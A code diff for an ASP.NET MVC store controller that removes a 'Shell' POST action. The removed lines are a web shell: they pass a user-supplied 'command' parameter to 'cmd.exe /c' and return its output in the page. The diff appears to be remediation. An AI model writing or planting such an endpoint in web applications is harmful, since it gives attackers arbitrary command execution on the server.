@@ -1,4 +1,4 @@
-﻿using System.Data.Entity;
+using System.Data.Entity;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
@@ -31,23 +31,6 @@ namespace MvcProductStore.Controllers
         [HttpGet]
         public ActionResult Shell()
         {
-            return View();
-        }
-
-        [HttpPost]
-        public ActionResult Shell(string command)
-        {
-            ProcessStartInfo psi = new ProcessStartInfo();
-            psi.FileName = "cmd.exe";
-            psi.Arguments = "/c " + command;
-            psi.RedirectStandardOutput = true;
-            psi.UseShellExecute = false;
-            Process p = Process.Start(psi);
-            StreamReader stmrdr = p.StandardOutput;
-            string s = stmrdr.ReadToEnd();
-            stmrdr.Close();
-
-            ViewBag.Message = s;
             return View();
         }
 
